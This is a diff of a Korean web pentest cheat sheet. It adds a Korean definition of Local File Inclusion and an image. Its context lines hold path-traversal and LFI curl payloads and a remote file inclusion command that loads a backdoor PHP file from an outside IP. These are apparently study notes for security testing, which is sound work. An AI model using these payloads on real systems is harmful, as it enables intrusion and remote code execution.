@@ -155,7 +155,7 @@ https://example.com/cms/login.php?language=..\..\..\..\windows\win.ini
 ---
 
 ## Local File Inclusion (LFI)
-
+- 공격자가 서버 내의 파일을 직접 열람하거나 실행할 수 있도록 유도하는 취약점
 ### 기본 LFI
 ```bash
 curl http://example.com/index.php?page=../../../../../../../../../var/www/html/index.php
@@ -219,6 +219,7 @@ curl "https://example.com/index.php?page=http://192.168.119.3/simple-backdoor.ph
 ---
 
 ## File Upload Vulnerabilities
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/243fbacc-c0c6-4c3c-a8b8-1ca3b665a05e" />
 
 ### 우회 기법
 ```
